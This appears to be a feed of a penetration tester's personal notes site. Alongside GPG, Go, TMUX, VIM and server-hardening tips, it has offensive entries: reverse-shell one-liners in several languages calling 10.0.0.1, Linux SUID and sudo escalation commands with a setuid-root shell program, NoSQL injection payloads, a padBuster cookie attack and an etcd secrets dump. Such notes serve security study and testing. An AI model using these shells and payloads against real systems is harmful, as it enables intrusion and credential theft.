item.title: About
item.description:
Name: Damian Age: 27 Job: DevOps Engineer Interests: Psychology DIY Cooking IT (Security, System Administration, Reverse Engineering, Networks) Accomplishments: Offensive Security Certified Professional CTF Winner @ x33fcon 2018
I treat people same way they treat me, most important thing in my life is to stay true to myself. I never give up, I do not tolerate half measures, I know what I do, what else do you want to know?

item.title: GPG
item.description: Set up GPG on computer to encrypt data & sign commits etc. MacOS Guide ~> brew install gnupg pinentry-mac ~> cat ~/.gnupg/gpg-agent.conf # Connects gpg-agent to the OSX keychain via the brew-installed # pinentry program from GPGtools. This is the OSX 'magic sauce', # allowing the gpg key's passphrase to be stored in the login # keychain, enabling automatic key signing. pinentry-program /usr/local/bin/pinentry-mac ~> cat ~/.gnupg/gpg.conf # Uncomment within config (or add this line) use-agent no-tty # This silences the "you need a passphrase" message once the passphrase handling is all set.

item.title: Golang
item.description: Tricks Shrink Go Binaries Up to 7 times! # -s and -w flags $ GOOS=linux go build cmd/go $ ls -l go -rwxr-xr-x 1 filippo staff 12493536 Apr 16 16:58 go $ GOOS=linux go build -ldflags="-s -w" cmd/go $ ls -l go -rwxr-xr-x 1 filippo staff 8941952 Apr 16 17:08 go # upx $ GOOS=linux go build cmd/go $ ls -l go -rwxr-xr-x 1 filippo staff 12493536 Apr 16 16:58 go $ upx --brute go Ultimate Packer for eXecutables Copyright (C) 1996 - 2013 UPX 3.

item.title: Linux Network Monitoring Tools
item.description: Original Link: https://haydenjames.io/linux-networking-commands-scripts/ arpwatch – ethernet activity monitor. bmon – bandwidth monitor and rate estimator. bwm-ng – live network bandwidth monitor. curl – transferring data with urls. darkstat – captures network traffic, usage statistics. dhclient – dynamic host configuration protocol client dig – query dns servers for information. dstat – replacement for vmstat, iostat, mpstat, netstat and ifstat. ethtool – utility for controlling network drivers and hardware. ftp – simplest file transfer protocol.

item.title: Linux Privilege Escalation
item.description: Links Basic Linux Privilege Escalation MySQL running as ROOT If you have password, log in, issue that query, it will return exit code of command. select sys_exec('whoami'); Find SUID programs and abuse them find / -user root -perm -4000 -print 2>/dev/null student@attack:/$ /usr/bin/vim.tiny /etc/sudoers SUID binary to compile and hijack PATH #include <stdio.h>#include <stdlib.h>#include <sys/types.h>#include <unistd.h> int main() { setuid(0); system("/bin/bash"); return 0; } Using System Tools # sudo find / -exec /bin/sh -I \; # sudo vi // inside :shell # sudo more/less // inside :bash # sudo python -c "import pty; pty.

item.title: No-SQL Injection
item.description: MongoDB login bypass We can also try to insert $ge instead of $ne operator and try to inject these instead of index names (username/password). MongoDB injections true, $where: '1 == 1' , $where: '1 == 1' $where: '1 == 1' ', $where: '1 == 1' 1, $where: '1 == 1' { $ne: 1 } ', $or: [ {}, { 'a':'a ' } ], $comment:'successful MongoDB injection' db.injection.insert({success:1}); db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1 || 1==1 ' && this.

item.title: PKI
item.description: Based on great article here, just my notes and highlighted fragments. Taken from article https://smallstep.com/blog/everything-pki.html TLDR: The goal of certificates and PKI is to bind names to public keys. Terms like entity, identity, identifier, name, subscriber, end entity, certificate authority, root certificates, leaf certificates (these belong to end entities), relying party ( a certificate user that verifies and trusts certificates issued by a CA ) A message authentication code (MAC) is a bit of data that’s used to verify which entity sent a message, and to ensure that a message hasn’t been modified.

item.title: Padding Oracle Attack
item.description: Performing Padding Oracle Attack using padBuster. Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies "secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2" 8 +-------------------------------------------+ | PadBuster - v0.3.3 | | Brian Holyfield - Gotham Digital Science | | labs@gdssecurity.com | +-------------------------------------------+ INFO: The original request returned the following [+] Status: 200 [+] Location: N/A [+] Content Length: 3854 INFO: Starting PadBuster Decrypt Mode *** Starting Block 1 of 4 *** INFO: No error string was provided.

item.title: Personal Security Checklist
Protecting Remote Server
item.description: Tips to protect remote server after fresh install, first thing you want to do is to update all packages and reboot system to apply kernel patches. ~> apt update && apt upgrade -y Then disable logging in with cleartext passwords ~> vi /etc/ssh/sshd_config # PermitRootLogin (yes) => (without-password|no) # PasswordAuthentication no ~> systemctl restart sshd Install Fail2Ban and create SSHD jail ~> apt install fail2ban ~> cat /etc/fail2ban/jail.d/defaults-debian.conf [11:22:10] [sshd] enabled = true port = ssh filter = sshd logpath = /var/log/auth.

item.title: Python
item.description: Styling Guide (PEP8) You can read it here. To start following it, install locally pycodestyle package and run it through your code. ~> pip install pycodestyle ~> pycodestyle --ignore=E501 run.py run.py:15:1: E302 expected 2 blank lines, found 1# main parser = argparse.ArgumentParser() parser.add_argument("action", choices=['list', 'add', 'search', 'import'], help="list local repositories, add new one or search by tags") parser.add_argument("--url", nargs='?', help="url of repository to add") parser.add_argument("--note", nargs='?', help="personal note about repository") parser.

item.title: Reverse Shells
item.description: Reverse shells in various languages/platforms. # bash bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 # perl perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' # python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' # php php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' # ruby ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' # netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f # java r = Runtime.getRuntime() p = r.

item.title: Shells
item.description: From my experience two shells that are worth notice are ZSH Fish In practice though, you can achieve Fish features installing particular plugins for ZSH, and yet, ZSH will still be more compatible with Bash, while Fish introduces it’s own syntax and quirks, which may be hard to adapt after long years with Bash/ZSH. Yet, still I find it very nice as out-of-box solution. Two very well known plugin packages for ZSH are

Articles great article from @bl4de on that subject another article from AppSecco Tools relative-url-extractor waybackurls trufflehog eslint + security rules (node for example or angular) linkfinder nodejsscan retire.js awesome-static-analysis

item.title: TMUX
item.description: Another tool I can’t live without. Available here and in various package repositories on most distribtuons. Where do I start… Maintain multiple terminals with ease, split screen in as many parts, as you want, make nice toolbars with information, and most motable, attach and detach your work from any place (assuming you work on remote machine). It also supports plugins, but again, I’m using very little of them and just roll with my configuration and some plugin to help me see battery status in terminal and for logging, maintained by TPM.

item.title: Tools
item.description: Generic page for interesting, useful tools, not really fitting into other category: mkcert - local TLS certificates with green lock via your own CA installed on system

item.title: Tricks
item.description: Miscellaneous tricks that did not made it into other categories. Find Real IPs behind CloudFlare I’m using CrimeFlare for it. Expose Local Server behind NAT via public VPS # run from machine which has access to private site ssh -R 8443:private-site:443 user@public_vps Now add new /etc/hosts entry reflecting vhost of private website pointing to public VPS IP and access it via https://private-site:8443/ Debugging on Container OS using Docker Actually it boils down to running Docker container which shares namespaces with host, installing tools there and debugging.

item.title: Tricks
item.description: All kinds of tricks. VIM :r filename will read file into buffer SSH ~ . - close hanged ssh session ~C - open simple interpreter ~^Z - hang ssh client ~# - show established connections ~& - end session

item.title: Tricks
item.description: Everything that doesn’t fit to one category. rdesktop – sharing directory between attacker/victim, works with pivoting Recently discovered very nice way of sharing files for Windows machines with RDP, local dir exploits/ in current location will be available as share. rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch keys, secrets, etc. curl http://:2379/v2/keys/?recursive=true share exploits over samba to windows machine # git-clone recent version! bastard/custom - [master●] » impacket-smbserver hacker $( pwd ) Impacket v0.

item.title: VIM
item.description: It’s commonly available on hosts, has lots of potential, it’s fast, tons of plugins, master it to save your time (and life sometimes). While there are frameworks like this one, I found it too slow after installing all the bloat and running on pure VIM with .vimrc, no plugins though for now (no time to check these out), but maybe will expand this section in future. My base .vimrc is below:

item.title: VPN
item.description: How to run your own VPN, and be able to switch IP when needed, also automate it! You will need some Cloud Provider which has API/CLI available to automate VM creation and then you will set up VPN server using ready scripts. Let’s roll with Digital Ocean for instance… We will use : automatic VPN setup on fresh instance Digital Ocean provisioned Ubuntu instance I made wrapper around well known solution to set up your own VPN instance, that allows you to quickly (5 minutes) spin new instance for your usage.

item.title: WPA/WPA2 Security
item.description: Articles new attack using pmkid pwning wpa/wpa2 networks with bettercap and the pmkid client-less attack

item.title: Windows Privilege Escalation
item.description: Windows Exploit/OS Reference Scripts JAWS Sherlock Powerup Google Windows Version for common exploits Links PE Methods for Pentesters Level Up! Practical Windows Privilege Escalation - Andrew Smith Windows Privilege Escalation Guide Practical Usage of NTLM Hashes AD Security Blog Dumping Windows Credentials Kernel Exploits systeminfo -> look up missing kb’s systeminfo | findstr /B /C:“OS Name” /C:“OS * Version” sherlock -> Find-AllVulns powershell Common Kernel Exploits MS16-014 - applies to: Windows 7 SP1 x86 MS16-016 - ‘WebDAV’ applies to Windows 7 SP1 x86 (Build 7601) MS16-032 - applies to: Windows 7 x86/x64, Windows 8 x86/64, Windows 10, Windows Server 2008-2012 R2 Config Files Credentials in ClearText or Base64 -> once Windows in installed

item.title: Wordpress
item.description: Update mutli-site primary URL In order to update main blog URL update these tables in database: wp_options: change “siteurl” and “home” to the new URL (http://blog/) wp_sitemeta: there’s a “siteurl” field you’ll need to change here wp_site: change the only value here to your new domain wp_blogs: each subsite will have an entry here, you’ll need to update the domain column for each row Also, update wp-config.php file: define( 'DOMAIN_CURRENT_SITE', 'newblog.

item.title: XSS
item.description: Everything related to XSS, tools, links, payloads, etc. Tools ezXSS - self hosted dashboard and server for your payloads bXSS - blind XSS application, had not played with it yet Sites XSS Payloads - site with JavaScript code that can actually hurt, keyloggers, data stealing etc. XSS Hunter - site that helps you by serving prepared scripts and generates some basic payloads, helps finding blind injections.
